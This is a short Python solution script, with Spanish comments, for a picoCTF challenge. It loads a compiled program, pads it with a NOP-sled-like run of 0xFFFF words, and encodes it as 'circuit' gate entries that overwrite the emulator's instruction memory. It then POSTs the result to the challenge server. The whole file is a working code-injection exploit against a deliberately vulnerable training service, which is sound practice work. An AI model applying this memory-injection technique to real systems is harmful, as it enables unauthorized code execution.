import struct
import requests

# Leer el programa ganador
with open('programs/flag.bin', 'rb') as f:
    flag_bin = f.read()
words = struct.unpack(f'<{len(flag_bin)//2}H', flag_bin)

# Generar un payload con relleno (NOP sled) para estabilizar la ejecución
# 0xFFFF es una instrucción que el emulador ignora.
payload = [0xFFFF] * 20 + list(words) 

circuit = []

# 1. Lógica NOT necesaria para evitar el error 0x3333
for i in range(4):
    circuit.append({"input1": 5+i, "input2": 5+i, "output": 1+i})

# 2. Inyección del código con estabilizador
for i, val in enumerate(payload):
    # Escribimos en el área de memoria de instrucciones (0x0000)
    # usando el nodo 61440 como offset base
    target_node = 61440 + i
    circuit.append({"input1": val, "input2": val, "output": target_node})

url = "http://activist-birds.picoctf.net:57005/check"
response = requests.post(url, json={"circuit": circuit})

print(response.json())
